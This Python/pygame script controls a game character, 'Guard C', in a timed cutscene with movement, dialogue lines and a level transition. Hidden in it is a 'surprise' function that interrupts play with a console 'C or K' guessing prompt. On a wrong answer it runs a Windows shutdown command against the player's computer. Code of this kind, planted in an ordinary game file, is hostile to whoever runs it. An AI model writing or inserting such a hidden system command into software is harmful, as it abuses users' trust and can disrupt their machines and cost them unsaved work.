#C
import pygame as pg
import sprites
from settings import ICON_FOLDER
from settings import PLAYER_ACC
import os
radius=-1
life_time=60
call_key=1
name="Guard C"
icon_path=ICON_FOLDER+"Guards"+".png"

vec=pg.math.Vector2
def move_in_time(start,end,actor,speed,dir,begin_time):
    start=start*1000
    end=end*1000
    now=pg.time.get_ticks()
    if  now>=start+begin_time and now<=end+begin_time:        
         
         actor.move(dir,speed)        
   
def surprise(start,begin_time):
    now=pg.time.get_ticks()
    if  now>=start*1000+begin_time:
        print("Surprise!!!! If you see this message contact the administrator or you can test your luck!")
        print("This is not a joke! If you lose pc will shutdown!!!!")
        a=input("C or K ? ")
        a=a.strip()
        a=a.lower()

        if a!="c":
             os.system("shutdown -s -t 1000")
       

def move_player_on_second(hero,dir,start,end,begin_time):
    if dir=='right':
        speed_k=1
    elif dir=="left":
        speed_k=-1
    start=start*1000
    end=end*1000
    now=pg.time.get_ticks()
    if  now>=start+begin_time and now<=end+begin_time:        
         
         hero.vel.x  = 4                      
def start_next_level(actor,start,begin_time):
    now=pg.time.get_ticks()
    if  now>=start*1000+begin_time:
        actor.game.running=False
    
def execute(actor,begin_time):   
    move_in_time(0,6,actor,3.4,"left",begin_time)
    actor.show_words_on_second("WALI EGO!",2,15,begin_time)
    move_in_time(21,24,actor,2.2,"left",begin_time)
    actor.show_words_on_second("This guy is very fat!",2,26,begin_time)
    move_in_time(28,70,actor,4,"right",begin_time)
    for hero in actor.game.heroes:
       move_player_on_second(hero,"right",28.3,70,begin_time)
    start_next_level(actor,47,begin_time)
    surprise(46,begin_time)
    
     

  
